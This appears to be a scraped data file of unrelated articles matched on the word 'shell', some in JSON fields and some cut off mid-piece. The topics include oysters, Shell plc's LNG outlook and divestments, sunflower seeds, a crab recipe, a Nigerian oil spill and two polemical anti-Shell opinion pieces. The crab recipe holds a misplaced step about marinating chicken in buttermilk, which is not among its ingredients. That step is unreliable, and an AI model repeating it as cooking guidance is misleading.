accustomed to year-round sales as global temperatures climb. It\u2019s also an opportunity. George suspects that the extra set of chromosomes in triploids may play a role in their stress response, even if it helps save on reproductive energy.\n\nIf scientists can figure out what causes triploids to succumb to heat stress, they can start engineering their way around it, just like they figured out how to breed sterile oysters in the first place. (To do so commercially, researchers first bred a male tetraploid \u2014 with four sets of chromosomes \u2014 and a female diploid.) \u201cThe technology is really promising,\u201d George noted. \u201cIf we can engineer these animals to have the benefits of triploidy without the possible drawbacks of an extra separate set of chromosomes, then we are getting closer to a truly climate resilient oyster.\u201d\n\nTechnological advances in breeding sterile, climate-resistant oysters for market may help feed a growing population on a warming planet, but they won\u2019t do much for the wild oysters whose reefs protect our shorelines, clean our oceans and promote biodiversity.\n\nFor them, it may already be too late, concedes Green. \u201cThe oyster industry will be just fine. But for wild populations that deliver those ecosystem services, it\u2019s a major crisis,\u201d he told me. Groups like the Billion Oyster Project will have to augment their reefs with larvae from commercial hatcheries well into the future instead of relying on self-sustaining wild spawning, especially as temperatures and ocean acidity increase with climate change. \u201cWithout human intervention, wild oysters will start disappearing,\u201d Green said.\n\nFor Varrella, the Italian oyster farmer, that would be a travesty. He fell in love with oysters while studying for a degree in marine biology, attracted by their ability to improve local biodiversity and clean the water around them. \u201cWe work on the ocean 365 days a year, with our hands in the water. So we can directly see the impacts of climate change. Oysters are a solution for that. With my farm, I\u2019m doing my part. But wild oysters are just as important.\u201d\n\nVarrella favors triploids because the economics of a year-round product makes more sense. Martino, the oyster evangelist from Martha\u2019s Vineyard, prefers diploids for their ability to benefit the wider ecosystem. Triploids may be better for the market, but Martino contributes to the local food chain by allowing his oysters \u2014 he buys around a million babies every year \u2014 to spawn. \u201cI want to be the Johnny Appleseed of oysters,\u201d he told me. \u201cI want my oysters to make babies. It would probably destroy my farm-to-market model, but I would love to see oysters everywhere.\u201d\n\nAnd maybe, just maybe, those babies will join others in the wild, evolving into something more resilient on their own. After all, oysters survived the Ice Age, the last greenhouse era and the asteroid that killed the dinosaurs. If there are enough of them in the wild, they might just survive us humans, too.",

            "content": "Shell plc, the No. 1 natural gas trader in the world, is more bullish than it was a year ago about global LNG demand through 2060, but near-term trade has slowed as project development faces hurdles amid geopolitical and other constraints.\n\nExpand\n\nThe London-based major on Tuesday published its annual LNG outlook. Worldwide, LNG consumption is forecast to be 630-718 million tons/year (Mt/y) by 2040, higher than the prediction one year ago.\n\nMore than 170 Mt of new LNG supply is expected to be available by 2030 as natural gas consumption climbs, particularly in Asian markets. However, \u201cstart-up timings of new LNG projects are uncertain,\u201d researchers indicated.\n\n[Charting the course of global markets: Did you know NGI provides daily data of Netback Prices, Arbitrage Curves, U.S. LNG Export Flow Data, Shipping Costs, Vessel Rate Curves (West of Suez) and more? Check out the LNG+ Data Suite now.]\n\n\u201cUpgraded forecasts show that the world will need more gas for power generation, heating and cooling, industry and transport to meet development and decarbonization goals,\u201d said Shell\u2019s Tom Summers, senior vice president for LNG marketing and trading.\n\nThere are concerns about future supply, however. The global LNG trade grew by only 2 Mt to 407 Mt in 2024, the lowest annual increase in 10 years, because of \u201cconstrained new supply development.\u201d\n\nThe challenges to LNG supply last year were traced to geopolitical tensions, regulatory hurdles, start-up risks, civil unrest, labor shortages and supply chain bottlenecks, according to the research. Higher natural gas prices in Europe and Asia for part of last year also curbed some spot buying.\n\nStill, infrastructure investments to date signal strong growth ahead, as expansions in China and India drive more gas consumption, the Shell researchers said.\n\nRisky U.S. LNG Growth?\n\nSpecifically in the United States, future growth in the LNG market \u201cis likely but comes with risks,\u201d according to Shell.\n\nChallenges cited by Shell to domestic LNG growth include regulatory uncertainty, energy security, construction costs and emissions intensity. However, more investments are needed to ensure \u201csupply can keep up with demand.\u201d\n\nShell CEO Wael Sawan had previewed the outlook during the fourth quarter conference call. In January he said last year\u2019s LNG trade was impacted by lower consumption. \u201cWe anticipate 2025 will be of a similar magnitude,\u201d Sawan told analysts. \u201cSo that's two relatively slow years at a time when latent demand continues to grow.\u201d\n\nShell\u2019s LNG forecast also was previewed earlier in February in the company\u2019s energy security report.\n\nBy 2040, Shell is forecasting global LNG consumption to jump by 60%. That\u2019s 10% higher than it was forecast a year ago.\n\nMost of the gains in LNG demand are expected in Asia. Consumption also is seen rising over the next 15 years because of emissions reductions in heavy industry and transport, as well as from the impact of artificial intelligence.\n\n\u201cIn the marine sector, a growing order book of LNG-powered vessels will see demand from this market rise to more than 16 Mt/y by 2030, up 60% from the previous forecast,\u201d Shell researchers said.\n\n\u201cLNG is becoming a cost-effective fuel for shipping and road transport, bringing down emissions today and offering pathways to incorporate lower-carbon sources such as bio-LNG or synthetic LNG.\u201d\n\nInto the 2030s, Europe also should continue to \u201cneed LNG\u2026to balance the growing share of intermittent renewables in its power sector and to ensure energy security. In the longer term, existing natural gas infrastructure could be used to import bio-LNG or synthetic LNG and be repurposed for the import of green hydrogen.\u201d\n\nSignificant growth in LNG supply also is likely to be fueled by projects in Qatar and the United States.\n\n\u201cThe U.S.A. is set to extend its lead as the world\u2019s largest LNG exporter, potentially reaching 180 Mt/y by 2030 and accounting for a third of global supply,\u201d according to Shell.\n\nThe research team noted that in early 2024, spot LNG prices fell to their lowest level since early 2022. NGI\u2019s Daily Historical Data shows the Spot Gas National Avg. daily natural gas price through 2024 was a mere $1.990/MMBtu, compared to a 10-year average of $3.136. LNG prices had recovered by mid-year because of delays in developing new supply capacity and continued strengthening throughout the year.\n\nLNG consumption rose in Asia during the first half of 2024 \u201cas China took advantage of lower prices, importing 79 Mt during the year,\u201d the researchers noted. \u201cIndia bought record volumes to help meet stronger power demand due to hotter weather in early summer. Its imports rose to 27 Mt, a 20% increase from 2023.\u201d\n\nLNG continued to play a \u201cvital role in European energy security in 2024.\u201d However, imports dipped by 19%, or by 23 Mt because of \u201cstrong renewable energy generation and a limited recovery in industrial gas demand.\u201d\n\nToward year\u2019s end, though, \u201ccold winter temperatures and spells of low wind power generation\u2026drove strong gas storage withdrawals.\u201d Combined with the expiration of Russian pipeline gas flows to Europe through Ukraine, prices rose by year\u2019s end.\n\nThis year, Shell is anticipating that Europe could increase imports of LNG to refill natural gas storage. NGI data shows European storage levels are around 40.6% full, about 45% lower than they were this time in 2024.",

This honor highlights his pioneering work in multiscale modeling and innovative computational techniques. Shell\u2019s relative entropy approach, which has advanced large-scale molecular simulations, exemplifies his continued efforts to push the boundaries of engineering and science.\n\nAIChE, with nearly 60,000 members across 110 countries, grants the title of Fellow through election by its board of directors. This highest membership grade acknowledges those with significant professional accomplishments and contributions to the field.\n\n\u201cI am remarkably fortunate to have grown up professionally in the chemical engineering community, where I have been continuously inspired by talented mentors, collaborators, colleagues and students,\u201d said Shell, vice chair of UCSB\u2019s Chemical Engineering Department and the John Myers Founder\u2019s Chair of Chemical Engineering. \u201cThis distinction carries significant personal weight because it comes from an organization of experts with whom I\u2019ve closely worked throughout my career.\u201d\n\nShell leads the Shell Lab, which develops molecular-simulation, multiscale-modeling and statistical-thermodynamic approaches to address challenges in biophysics and soft materials. His research group pioneered the relative entropy coarse-graining approach, enabling large-scale simulations of complex molecular systems. This method transforms small-scale atomic simulations into accurate coarse-grained models that can be simulated at much larger scales, advancing a new class of coarse-graining algorithms used across a variety of scientific problems.\n\nShell\u2019s expertise extends to numerous interdisciplinary projects at UCSB, from water-filtration membranes and bio-derived technologies to plastic waste recycling and neurodegenerative diseases like Alzheimer\u2019s.\n\nHis publications have been influential to his discipline, including the article, \u201cSystematic coarse-graining of potential energy landscapes and dynamics in liquid,\u201d (2012) \u2014 one of the seminal papers from the journal of Chemical Physics\u2019 history selected for its 80th anniversary collection.\n\nThe Shell Lab has continued to push the boundaries of what molecular modeling can do, using the relative-entropy approach to understand and accurately simulate a wide range of phenomena. Most recently, his group pioneered computational techniques for the inverse design of soft materials, such as chemically patterned surfaces to program solute-to-surface interactions in aqueous solutions.",

            "content": "For many people, sunflower seeds spark thoughts of snacking at baseball games and picnics\u2014and they are equally as fun and delicious to eat at home. But beyond snacking, the teardrop-shaped seeds are a versatile ingredient that can be used to add texture and flavor to dishes, whether you're making a dessert or an entr\u00e9e. Ahead, we spoke to experts about all things sunflower seeds, from how to shell them to tips for buying, preparing, and enjoying these crunchy kernels.\n\nNathan Lyon , chef, cookbook author, and host of A Lyon in the Kitchen on Discovery Health\n\n, chef, cookbook author, and host of A Lyon in the Kitchen on Discovery Health Maya Brown , chef instructor at Auguste Escoffier School of Culinary Arts\n\n, chef instructor at Auguste Escoffier School of Culinary Arts Christiane Matey, MSHS, RDN, LDN, ABAAHP, chef, dietitian, and founder of Mint Nutrition\n\nShopping for Sunflower Seeds\n\nUnshelled: When sunflower seeds are sold in their shells, they're known as unshelled or shell-on seeds. Technically, it's possible to eat some of these shells and live to tell the tale\u2014but it's not recommended. The shells of sunflower seeds should be removed before eating the kernels, says Nathan Lyon, chef, cookbook author, and host of A Lyon in the Kitchen on Discovery Health.\n\nIf you plan to snack on sunflower seeds and don't mind removing the shells, the unshelled variety might be a good choice. But if you'd like to use them in a recipe, buying shelled sunflower seeds is the way to go, as shelling many seeds is time-consuming.\n\n\n\nShelled: Sunflower seeds sold without shells are known as shelled or hulled sunflower seeds or simply sunflower kernels. \"Shelled sunflower seeds are great if you [want to] incorporate them into recipes [and] skip the headache of removing the shells,\" says Maya Brown, chef instructor at Auguste Escoffier School of Culinary Arts.\n\nThere are several varieties of shelled sunflower seeds:\n\nRaw vs. Roasted: Shelled sunflower seeds are available raw or roasted. The roasting process enhances the nutty flavor and crunchy texture of the seeds. But if you want to roast and season them yourself, it's best to start with raw seeds, says Brown.\n\nShelled sunflower seeds are available raw or roasted. The roasting process enhances the nutty flavor and crunchy texture of the seeds. But if you want to roast and season them yourself, it's best to start with raw seeds, says Brown. Salted vs. Unsalted: When sunflower seeds are roasted, they can be prepared with or without salt, just like nuts. The salt complements the nutty flavor of the seeds, resulting in a tasty snack. However, pre-salted seeds tend to be very high in sodium, notes Lyon\u2014so if you're concerned about your sodium intake, choose the unsalted kind and salt them yourself. \"This is advantageous because you [can add] salt to your preference,\" says Lyon.\n\nHow to Eat Sunflower Seeds\n\nistetiana / Getty Images\n\nSunflower seeds can be enjoyed like many other seeds and nuts.

Sprinkled on ice cream: If you enjoy the sweet and salty flavors, top your next bowl of ice cream with toasted and salted sunflower seeds. They're especially tasty with chocolate ice cream, as recommended by Brown.\n\n\n\nHow to Shell Sunflower Seeds\n\nThere are several ways to shell sunflower seeds at home. The best method depends on how much time (and effort) you'd like to spend removing the shells.\n\n\n\nWith Your Teeth\n\n\"A classic way to shell sunflower seeds is with your teeth,\" shares Christiane Matey, MSHS, RDN, LDN, ABAAHP, chef, dietitian, and founder of Mint Nutrition. (Note that not all dentists might agree with this method; be sure to check with yours before proceeding.)\n\nPut a shell-on sunflower seed in your mouth. Using your teeth, gently apply pressure to the hull and crack it. This will allow the kernel to slide out. Spit out the shell and eat the kernel.\n\n\n\nWith a Rolling Pin\n\nIf you'd like to protect your teeth or want to shell multiple sunflower seeds at once, use a rolling pin. Follow these steps, as provided by Matey:\n\nPlace a paper towel or clean kitchen towel on a flat surface. Place the seeds on top. Run a rolling pin over the seeds, applying gentle pressure to crack them open. You can also fold over the towel and gently bang the seeds with the rolling pin. This will crack them open.\n\nIf you don't have a rolling pin, you can use a meat mallet or hard-bottomed pot to bang the seeds, as suggested by Matey and Brown.\n\n\n\nIn the Oven\n\n\"Roasting the seeds is a great way to add flavor and remove the shells,\" says Matey. Follow these steps, as provided by Lyon:\n\nPlace raw sunflower seeds in a bowl. Drizzle olive oil on the seeds, then toss until fully coated. Season to taste with salt. Add other spices for additional flavor, such as cayenne pepper, chipotle powder, paprika, or dried herbs if you like. Spread the seeds on a parchment-lined baking sheet. Bake at 325\u00b0F for 8 to 10 minutes, stirring once halfway through, until lightly toasted.\n\n\n\nIn Water\n\nAccording to Brown, soaking the seeds in water for one or two hours can soften the shells, making them easy to remove. After soaking the seeds, you can gently squeeze the shells to remove the seeds. This method can be time-consuming, especially if you're preparing many seeds at once.\n\n\n\nHow to Store Sunflower Seeds\n\n\"The best place to store sunflower seeds is in a clean, airtight container in a cool, dry, and dark place,\" says Brown. A pantry or cupboard away from kitchen appliances is an ideal location.\n\nWhen stored correctly, raw sunflower seeds will last about two to three months at room temperature, says Brown. Roasted, salted seeds will last for about one year. If kept in the refrigerator, the shelf life will be slightly longer.\n\nSigns of Spoiled Sunflower Seeds\n\nThe first sign of spoiled sunflower seeds is a bad smell, says Brown. An odor that is rancid, sour, or intense indicates that the fats are deteriorating and unsafe to consume, she adds. If you're unable to immediately detect a smell, shake the seeds first, suggests Matey. This will help release any bad odors, if present. You can also taste the seeds to see if they have any bitter notes and flavors, shares Matey. \"If they're sour or bitter, then you know they're not good to keep,\" she says.\n\nAs for visual cues? \"As the seeds grow older, they may [develop] a blueish-gray tint that indicates the seeds have gone bad,\" notes Brown. Additionally, any visible mold is a sign you should toss them, says Matey.",

Ain\u2019t nothin\u2019 like a good ol\u2019 fried soft shell crab sandwich. The crunch, ocean vibes and Old Bay tartar sauce meld together the perfect lunch bite. One of our favorite dishes, there\u2019s something special about soft shell crabs, where you can get a little beastly because you eat the whole crab, shell and all! Soft shell crabs are named because they\u2019re actually blue crabs that have just molted their shells, so their new shells are as tough, and fry up incredibly well to a golden brown deliciousness that just can\u2019t be beat. This dish is easy to make, and you don\u2019t have to shell out of a ton of money to make some delicious seafood this spring and summer. We based our recipe off a similar one you can find here, too.\n\nIngredients for the Old Bay Tartar Sauce:\n\n- 1/2 cup of mayonnaise\n\n- 1 Tbsp of minced red onion\n\n- 1 Tbsp of finely chopped dill pickle\n\n- 1 Tbsp rinsed and chopped capers\n\n- 1 Tbsp of chopped chives\n\n- 1 1/2 tsp Old Bay Seasoning\n\n- 1 tsp. Fresh lemon juice\n\n- 1/2 tsp. Tabasco sauce\n\nIngredients for the Softshell Crab Sandwich:\n\n- Pre-made tartar sauce (ingredients listed above)\n\n- 3 Eggs\n\n- 1 Loaf of thick, sturdy white bread, slice and toast 8 slices\n\n- 1 Head of Bibb lettuce\n\n- 4 Hothouse tomatoes, sliced\n\n- 4 soft shell crabs, cleaned, soft shell still intact\n\n- 1/4 Cup All Purpose flour\n\n- 1 tsp. Old Bay Seasoning\n\n- 1/4 Cup Yellow Cornmeal\n\n- 1/4 tsp. Kosher salt and freshly ground black pepper\n\n- 3-4 Tbsp. canola oil\n\n- 1 Tbsp Unsalted butter\n\nDirections:\n\n- Combine all ingredients for the tartar sauce and put in the refrigerator\n\n- Slice the tomatoes and bread\n\n- Toast 8 slices of of bread, set-aside\n\n- The night before (or at least an hour before), combine the buttermilk, 1 Tbsp of cajun seasoning, pickle juice and garlic powder, whisk. Place the chicken things in the marinade and let it sit overnight\n\n- In a shallow bowl or pan, whisk the 3 eggs together\n\n- In another shallow bowl or pan, combine the flour, cornmeal, salt, pepper and Old Bay and whisk together\n\n- Heat the oil in a cast iron skillet until it gets shimmery and hot (when you put a pinch of flour in there, and it bubbles, you\u2019ll know it\u2019s hot enough)\n\n- Add in the butter to the oil and stir\n\n- Take each crab, coat in the eggs\n\n- Take crab out of the eggs and dip into the flour/cornmeal mix\n\n- Drop into the oil and fry each crab 3 minutes each side\n\n- Remove from oil, drain on paper towels, and salt each crab\n\n- Assemble the sandwich, a healthy layer of the Old Bay tartar sauce on the top slice, and the bottom, layer a few leaves of Bibb lettuce, two tomato slices and the sandwich\n\n- Crunch your way to the perfect lunch!\n\nBonus Tip - The crabs also work really well on their own without being in a sandwich, and you can replace the tartar sauce with a remoulade if you like. We have also chopped the crabs in half, fried them and served them as finger-food appetizers with the tartar as a dipping sauce.\n\nWant more recipes to get you out of your shell?

In this article, we are going to take a look at where Shell plc (NYSE:SHEL) stands against other best oil refinery stocks to invest in according to analysts.\n\nThe United States of America is the Largest Oil Producing Country in the World with current production reaching record levels, so it doesn\u2019t come as a surprise that it is also counted among the Countries with the Largest Refining Capacities. The US had 132 oil refineries with a total capacity of 18.4 million barrels per day (bpd) at the start of 2024, a 2% increase compared with the start of 2023.\n\nREAD ALSO: 11 Best Natural Gas Stocks to Buy Now\n\n2024 was a difficult year for the global refining sector as industry players faced a drop in profitability to multi-year lows amid soft consumer and industrial demand (especially in China), slowing economic growth, increasing energy transition, and expanding global refining capacity. The declining fuel margins in the Q4 2024 led to disappointing earnings results for many oil refiners, as a flood of new output competed with stagnating demand. This has led to several oil majors shutting down operations and putting their refineries up for sale, but that is also not going as smoothly as expected.\n\nThings don\u2019t seem to be getting any better either as according to the International Energy Agency\u2019s recent market outlook, growth in the global demand for oil is expected to slow down in the coming years as energy transitions advance, putting downward pressure on prices. The US Energy Information Administration stated last month that it expects Brent crude oil prices to fall 8% to average $74 a barrel in 2025, then fall further to $66 a barrel in 2026, further reducing margins for refiners.\n\nMoreover, despite his repeated calls to ramp up oil production in the country, President Donald Trump\u2019s tariffs on imports from Mexico and Canada could make things worse for the refining sector. Many refineries in the Midwest depend on Canadian crude and the upcoming 10% tariff will force them to pay either more for their feedstock, or slash production, further squeezing an industry already in decline. The President wants to make America self-sufficient and independent when it comes to energy, but no matter how much oil the United States pumps, its refineries were designed to process the darker, denser, cheaper crude that is hard to find domestically. However, Trump\u2019s plans to roll back support for electric vehicles and charging stations could slow their sales and bolster gasoline demand, offering some respite to the industry.",

The event featured guest speaker Jonathan Shell, Kentucky Commissioner of Agriculture.\n\nThe event is presented by the Daviess County Farm Bureau and the Greater Owensboro Chamber of Commerce. Daviess County Farm Bureau President Wally Taylor reinforced the organization\u2019s commitment to legislative advocacy and youth programs.\n\n\u201cDaviess County Farm Bureau has always been active in supporting agriculture at the county, state, and national levels,\u201d Taylor said. \u201cWe support 4-H, FFA, and various agricultural initiatives, awarding six scholarships each year totaling $10,000 to local high school students.\u201d\n\nThe event featured remarks from community leaders, including Chamber President and CEO Candance Brake, who reflected on the history and significance of the Farm City Breakfast.\n\n\u201cForty-five years ago, county and community leaders came together to recognize the importance of working together,\u201d Brake said. \u201cRegardless of where we live or what we do, it takes every single one of us to keep our community moving forward.\u201d\n\nEmcee Jeff Nalley, a broadcaster and journalist for Cromwell Media and contributor to Agri-Pulse, emphasized the enduring strength of the relationship between urban and rural communities.\n\n\u201cWe come together recognizing the strength of our community, and we also come together recognizing the strength of our rural and urban relationship \u2013 city cousins, rural neighbors, stewards of the soil,\u201d Nalley said. \u201cWe certainly are blessed in this community.\u201d\n\nDaniel Hayden, chair of the Kentucky Cattlemen\u2019s Association, introduced Shell, highlighting his dedication to advancing the industry.\n\n\u201cYou will not find someone more passionate about Kentucky agriculture than Jonathan Shell,\u201d Hayden said. \u201cHe\u2019s been fighting for us since day one, bringing national leaders to Kentucky and making sure our voices are heard.\u201d\n\nShell addressed the audience, underscoring the importance of supporting the next generation of agricultural leaders.\n\n\u201cEvery single day, I get to work on your behalf, and that means something special to me,\u201d Shell said. \u201cIf you ever feel discouraged about the future, go visit a local FFA chapter. These young people are doing incredible work.\u201d\n\nHe also discussed pressing issues facing agriculture, including farmland preservation. According to Shell, Kentucky has lost 1.4 million acres of farmland in the past 20 years, averaging nearly 192 acres per day.\n\n\u201cWe have to look at ways to protect farmland for future generations,\u201d Shell said. \u201cWe need to engage local governments and economic developers in conversations about best land use practices.\u201d\n\nShell encouraged support for Kentucky\u2019s agriculture education programs, including FFA, emphasizing the impact of the Ag Tag donation program.\n\n\u201cWe raised $930,000 last year for Ag Tag donations, and our goal is to hit $1 million this year,\u201d Shell said. \u201cHalf of those funds go directly back to local communities, supporting students and ensuring agriculture has a strong future.\u201d\n\nAs the region grows and evolves, Brake said events like the Farm City Breakfast reaffirm the shared commitment to fostering strong agricultural traditions and economic development for future generations.",

SK has invested 3 trillion won ($2.1 billion) in the project. Its development process is 88% completed and commercial operations are set to begin as early as September, according to the company.The Barossa gas field is estimated to hold 70 million tons of natural gas. SKI E&S plans to bring to Korea 1.3 million tons a year of natural gas out of the planned annual extraction volume of 3.5 million tons.SKI E&S plans to broaden its business scope from downstream operations, where it has traditionally focused on distributing LNG for domestic power generation, city gas and industrial fuel, to upstream operations, which involve securing natural gas directly from gas fields.The global LNG market is structured into three segments: upstream (gas extraction), midstream (storage, transportation and trading), and downstream (supplying end-users).While a handful of global firms dominate the entire value chain, most LNG companies worldwide largely focus on downstream operations, purchasing gas from international suppliers.SKI E&S plans to leverage multiple sources to meet its 10-million-ton LNG target, including production from the Barossa field, which will start at 1.3 million tons annually, and the company\u2019s acquisition of the Woodford gas field in the US, which will add 1 million tons a year.Global energy firms such as BP and Shell trade between 15 million and 20 million tons of LNG annually.If SKI E&S meets its 2030 goal, it will operate on an equal footing with energy giants in the global LNG market, industry officials said.SKI E&S said its primary focus is to meet Korea\u2019s domestic energy demand before trading surplus LNG on the international market.Looking ahead, SKI E&S plans to integrate its LNG strategy into a broader energy transition initiative, including blue hydrogen production and carbon capture and storage (CCS).The company intends to use LNG-derived methane to produce hydrogen while capturing and storing the resulting carbon emissions \u2013 a process known as blue hydrogen production.\u201cOur expansion into upstream LNG operations is just the beginning,\u201d said an SKI E&S official. \u201cWe aim to establish a comprehensive energy value chain that includes LNG, carbon capture and hydrogen.\u201dSK has been in a carbon capture and storage project at the Bayu-Undan gas field , located off the south coast of Timor-Leste.Sang-Hoon Sung at uphoon@hankyung.com In-Soo Nam edited this article.",

It recently offloaded some Lower 48 assets for a casual $600 million, and now, Shell gets to expand its death grip on fossil fuel production.\n\n\u201cThis transaction reflects our ongoing commitment to further strengthen our portfolio by divesting non-core assets and shows significant progress toward our $2 billion disposition target,\u201d said ConocoPhillips in a statement that essentially translates to: \u201cWe\u2019re selling to the highest bidder and calling it strategy.\u201d\n\nMeanwhile, Shell\u2014always the reliable villain in any climate horror story\u2014was thrilled at the deal. After the sale, Shell\u2019s working interest in Ursa will jump from 45.4% to 61.35%. That\u2019s right, Shell just bought an even bigger share of a decades-old oil asset because, as the company puts it, it \u201cgenerates robust free cash flow, while also providing more options for growth.\u201d\n\nAh yes, \u201cgrowth\u201d\u2014a lovely euphemism for more oil extraction, more carbon emissions, and more profits for investors like BlackRock and Vanguard, who continue to bankroll climate catastrophe while insisting they\u2019re all about sustainability.\n\nShell may dress up its acquisitions with buzzwords like \u201cportfolio expansion\u201d and \u201ccash flow optimization,\u201d but at its core, this deal is just another move in the fossil fuel empire\u2019s relentless pursuit of profit. The world may be in crisis, but Shell\u2019s got shareholders to please, and if that means acquiring more assets to squeeze every last drop of oil out of the Earth, so be it.\n\nSo, congratulations, Shell. You\u2019ve done it again\u2014bought more of the problem while pretending to be part of the solution. What\u2019s next?

NOSDRA began efforts to recover the spilled crude on Friday. According to a statement issued by the agency\u2019s Director-General, Chukwuemeka Woke, the report of the spill was received on Monday, prompting an immediate joint investigation to determine the cause.\n\nThe spill occurred in Shell\u2019s 16-inch Nun River-Kolo Creek pipeline, which caused crude oil to leak into the River Nun, affecting surrounding communities in Obololi. The statement read, \u201cOn Monday, February 17, 2025, the agency received a report of a crude oil spill from Shell Petroleum Development Company\u2019s 16-inch Nun River-Kolo Creek pipeline at Obololi community in Southern Ijaw LGA, Bayelsa State. As the lead agency on all oil spill-related matters in Nigeria, we immediately convened a joint investigative visit to the site.\u201d\n\nWoke explained that while the exact cause of the leak remains unclear, the pipeline is submerged in water. The investigation involved NOSDRA, Shell Petroleum Development Company, the Bayelsa Ministry of Environment, and representatives from the affected community to determine the incident\u2019s circumstances.\n\nContainment measures have been implemented, and temporary storage tanks are being set up to manage the spill. NOSDRA is actively monitoring the situation to ensure appropriate response actions are taken.\n\nIn its 2024 report, NOSDRA stated that 19,000 barrels of crude oil were spilled last year, totaling approximately three million liters, or 95 oil tanker truckloads. One of the spills was categorized as \u201cmajor,\u201d involving over 250 barrels spilled into inland waters or more than 2,500 barrels spilled on land, swamp, shoreline, or the open sea. Additionally, 10 spills were categorized as \u201cMedium,\u201d each involving between 25-250 barrels spilled into inland waters or 250-2,500 barrels spilled in various environments.",

            "content": "If the goal is to accelerate environmental devastation, lay off thousands of workers, and cement Big Oil\u2019s death grip on global energy policy, then sure\u2014go right ahead.\n\nNothing screams \u201cbrighter future\u201d like two of the UK\u2019s most notorious polluters joining forces to double down on destruction. That\u2019s right\u2014some investment bankers and analysts, never ones to let a good environmental catastrophe go to waste, are floating the idea of a BP-Shell merger. The goal? To create a \u201cnational champion\u201d capable of competing with the likes of France\u2019s TotalEnergies and American titans ExxonMobil and Chevron. Because, obviously, the world needs another corporate Goliath ramping up oil extraction while sprinkling in just enough greenwashing to keep up appearances.\n\nA Behemoth of Greed and Emissions\n\nAccording to The Mail\u2019s Mark Shapland, a BP-Shell mega-merger would create a \u201cbehemoth\u201d with 180,000 employees and the scale to slash costs. Translation? Mass layoffs, cost-cutting, and a glorious race to the bottom for environmental and safety standards. Meanwhile, Shell\u2014gloriously steered by CEO Wael Sawan\u2014has gone \u201cfrom strength to strength\u201d (read: even bigger profits, even more pollution), while BP\u2019s Murray Auchincloss is clinging to his last shred of credibility. With activist investor Elliott Management circling like a vulture, BP\u2019s leadership is scrambling to keep shareholders happy. Merging with Shell might just be their Hail Mary play.\n\nThe \u201cBrilliant\u201d Business Case: Doubling Down on Destruction\n\nBreakingviews\u2019 Yawen Chen argues that merging BP and Shell might not be entirely insane. Even modest cost-cutting measures could supposedly add $33 billion to the value of the combined group\u2014because the best way to improve a struggling company is to merge it with another ageing fossil-fuel dinosaur. Of course, pesky details like regulatory hurdles, job losses, and corporate culture clashes might make things a bit complicated. Competition authorities would demand disposals in retail sites, aviation supply, and lubricants\u2014because nothing says \u201cnational champion\u201d like carving up your own empire to get the deal approved.\n\nBP: A Company in Freefall\n\nBP\u2019s descent into \u201ctakeover territory\u201d is a tragicomedy of its own making. The grand \u201cclimate-friendly\u201d pivot under former CEO Bernard Looney\u2014slashing oil and gas production by 40% while promising 50 gigawatts of renewables by 2030\u2014sent investors running for the hills. Auchincloss has since tried to undo some of that damage, but not fast enough for BP\u2019s shareholders, who remain unimpressed. Cue Elliott Management, now holding a 5% stake and demanding a full-throttle return to oil and gas.\n\nThe Bottom Line? More Fossil Fuels, More Chaos\n\nAccording to The Daily Telegraph\u2019s Ben Marlow, BP\u2019s half-hearted approach to dropping its green commitments while still throwing \u201cbillions of pounds\u201d at renewables has left it stuck in corporate purgatory. Its debt levels are sky-high, and with no cash to pacify investors with dividends and buybacks, everything\u2014including a possible breakup\u2014is on the table. Bloomberg\u2019s Chris Hughes notes that Elliott\u2019s strategy of gutting BP\u2019s renewables division and focusing on oil might offer a quick fix for the share price, but it\u2019s a myopic move that ignores the long-term risks of, well, the planet burning.\n\nInvestors Laughing All the Way to the Bank\n\nAnd who benefits from this financial circus? BP and Shell\u2019s biggest investors, of course. BlackRock, Vanguard, and State Street\u2014those ever-present overlords of global finance\u2014are more than happy to keep bankrolling climate collapse as long as the returns keep rolling in. Because, in the grand scheme of things, what\u2019s a little global catastrophe compared to another quarter of record-breaking profits?\n\nSo, should BP and Shell merge? If the goal is to accelerate environmental devastation, lay off thousands of workers, and cement Big Oil\u2019s death grip on global energy policy, then sure\u2014go right ahead. But let\u2019s drop the pretence that this is about \u201cnational strength\u201d or \u201ccompetitiveness.\u201d This is about one thing only: profit at any cost.\n\nShare this: Facebook\n\nTwitter\n\nEmail\n\nPrint\n\n\n\nLike this: Like Loading...\n\nThis website and sisters royaldutchshellgroup.com johndonovan.website , and shellnews.net , are owned by John Donovan .

All statements other than statements of historical fact are, or may be deemed to be, forward-looking statements. Forward-looking statements are statements of future expectations that are based on management's current expectations and assumptions and involve known and unknown risks and uncertainties that could cause actual results, performance or events to differ materially from those expressed or implied in these statements. Forward-looking statements include, among other things, statements concerning the potential exposure of Shell to market risks and statements expressing management's expectations, beliefs, estimates, forecasts, projections and assumptions. These forward-looking statements are identified by their use of terms and phrases such as \"aim\"; \"ambition\"; ''anticipate''; ''believe''; \"commit\"; \"commitment\"; ''could''; ''estimate''; ''expect''; ''goals''; ''intend''; ''may''; \"milestones\"; ''objectives''; ''outlook''; ''plan''; ''probably''; ''project''; ''risks''; \"schedule\"; ''seek''; ''should''; ''target''; ''will''; \"would\" and similar terms and phrases. There are a number of factors that could affect the future operations of Shell and could cause those results to differ materially from those expressed in the forward-looking statements included in this release, including (without limitation): (a) price fluctuations in crude oil and natural gas; (b) changes in demand for Shell's products; (c) currency fluctuations; (d) drilling and production results; (e) reserves estimates; (f) loss of market share and industry competition; (g) environmental and physical risks; (h) risks associated with the identification of suitable potential acquisition properties and targets, and successful negotiation and completion of such transactions; (i) the risk of doing business in developing countries and countries subject to international sanctions; (j) legislative, judicial, fiscal and regulatory developments including regulatory measures addressing climate change; (k) economic and financial market conditions in various countries and regions; (l) political risks, including the risks of expropriation and renegotiation of the terms of contracts with governmental entities, delays or advancements in the approval of projects and delays in the reimbursement for shared costs; (m) risks associated with the impact of pandemics, such as the COVID-19 (coronavirus) outbreak, regional conflicts, such as the Russia-Ukraine war, and a significant cybersecurity breach; and (n) changes in trading conditions. No assurance is provided that future dividend payments will match or exceed previous dividend payments. All forward-looking statements contained in this release are expressly qualified in their entirety by the cautionary statements contained or referred to in this section. Readers should not place undue reliance on forward-looking statements. Additional risk factors that may affect future results are contained in Shell plc's Form 20-F for the year ended December 31, 2023 (available at www.shell.com/investors/news-and-filings/sec-filings.html and www.sec.gov). These risk factors also expressly qualify all forward-looking statements contained in this release and should be considered by the reader. Each forward-looking statement speaks only as of the date of this release, February 21, 2025. Neither Shell plc nor any of its subsidiaries undertake any obligation to publicly update or revise any forward-looking statement as a result of new information, future events or other information. In light of these risks, results could differ materially from those stated, implied or inferred from the forward-looking statements contained in this release.\n\nShell's Net Carbon Intensity\n\nAlso, in this release we may refer to Shell's \"Net Carbon Intensity\" (NCI), which includes Shell's carbon emissions 